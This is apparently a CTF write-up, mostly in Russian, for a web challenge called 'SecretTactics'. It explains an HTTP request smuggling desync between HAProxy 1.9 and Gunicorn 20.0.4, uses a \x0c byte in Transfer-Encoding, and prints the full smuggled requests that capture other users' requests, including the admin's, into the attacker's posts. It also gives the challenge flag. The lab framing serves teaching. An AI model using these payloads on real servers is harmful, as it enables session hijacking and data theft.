# SecretTactics

## Описание
We have found the secret community in the secret shelter and they have their secret forum. There are a lot of secret users that are sharing their secret tactics on how to win in the secret casino. Moreover, somewhere on the site is a secret admin. Find out his secret tactic and give it to us!

http://tasks.sprush.rocks:8080/

Author: @Agalas

## Краткое описание уязвимости
На данном сервисе присутствует уязвимость HTTP request smuggling. При подстановки в заголовок Transfer-Encoding спец. символа, который не будет обработан HAProxy (например \x0c), но будет обработан Gunicorn сервером. Из-за чего произойдет рассинхронизация, что позволит вставить в чужой запрос свои строки.
[Полное описание](https://gist.github.com/ndavison/4c69a2c164b2125cd6685b7d5a3c135b)

# Решение
## Исследование сервера
По заголовка, который отправляет сервер можно понять, что задействован HAProxy 1.9 и Gunicorn 20.0.4
Регистрируемся и видим функционал для изменения описания профиля и имени и публикации записей. 

<img src="https://puu.sh/HraZe/13b857b626.png" width="750">

Главная задача для нахождения флага — узнать логин администратора, так как все пользователи имеют доступ к просмотру профилей, где и находится флаг.

## Подготовка эксплоита и исполнение

Собираем HTTP запрос с заголовкоми `Transfer-Encoding:<\x0c>chunked`, `Connection: keep-alive`; `0c` — необходимый символ для пропуска заголовка сквозь HAProxy. В конце так же необходимо завершить запрос 
```
1
A
0
```
и получаем 

```
GET /login HTTP/1.1
Host: tasks.sprush.rocks:8080
Content-Length: *
Connection: keep-alive
Transfer-Encoding:\x0cchunked


1
A
0

```
Вместо `*` нужно будет поставить сумму длины своего и "поддельного" запроса. 

После этого запроса мы должны собрать новый, чтобы сохранить себе на странице HTTP запрос администратора (И не только, так как возможен перехват запросов других игроков)
Для удобства можем воспользоваться готовым запросом, который создается при создании поста.

```
POST /user/* HTTP/1.1
Host: tasks.sprush.rocks:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Origin: http://tasks.sprush.rocks:8080
Connection: close
Referer: http://tasks.sprush.rocks:8080/user/*
Cookie: session=*
Upgrade-Insecure-Requests: 1

csrf_token=*&submit=Share&post=
```

Вместо `*` в url подставить свой зарегистрированный логин, `Cookie: session=*` `csrf_token=*` поставить свои значения. 
Полностью собираем запрос, который получился.

```
GET /login HTTP/1.1
Host: tasks.sprush.rocks:8080
Content-Length: *
Connection: keep-alive
Transfer-Encoding:\x0cchunked


1
A
0

POST /user/* HTTP/1.1
Host: tasks.sprush.rocks:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Origin: http://tasks.sprush.rocks:8080
Connection: close
Referer: http://tasks.sprush.rocks:8080/user/*
Cookie: session=*
Upgrade-Insecure-Requests: 1

csrf_token=*&submit=Share&post=
```

Не забудьте изменить первый `Content-Length: *`, как сумму длин запросов.

## Ждем администратора и забираем флаг

Отправляем несколько таких запросов и следим за своими постами в профиле. 

<img src="https://puu.sh/HrbEN/6320dc1a17.png" width="750">

Переходим по ссылке и получаем флаг!
`SPR{on3_arm3d_b4nd1t_1s_b3tt3r_th4n_tw0_h4nd3d_pr0xy}`
<img src="https://puu.sh/HrbGk/f09aa7ef55.png" width="750">
